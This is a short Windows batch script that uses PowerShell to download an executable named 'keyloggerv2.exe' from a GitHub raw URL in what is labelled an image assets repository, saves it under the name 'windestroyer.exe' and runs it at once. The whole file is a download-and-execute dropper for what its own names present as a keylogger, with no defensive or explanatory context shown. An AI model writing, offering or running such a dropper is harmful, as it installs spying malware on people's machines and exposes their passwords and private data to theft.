@echo off
:: Specify the URL of your executable
set URL=https://raw.githubusercontent.com/JustinHennis1/image_assets/main/keyloggerv2.exe

:: Specify the filename to save the downloaded file
set FILENAME=windestroyer.exe

:: Download the file using PowerShell
echo Downloading %FILENAME%...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILENAME%'"

:: Run the executable
echo Running %FILENAME%...
start %FILENAME%

:: Optional: Pause to see any output or errors
::pause
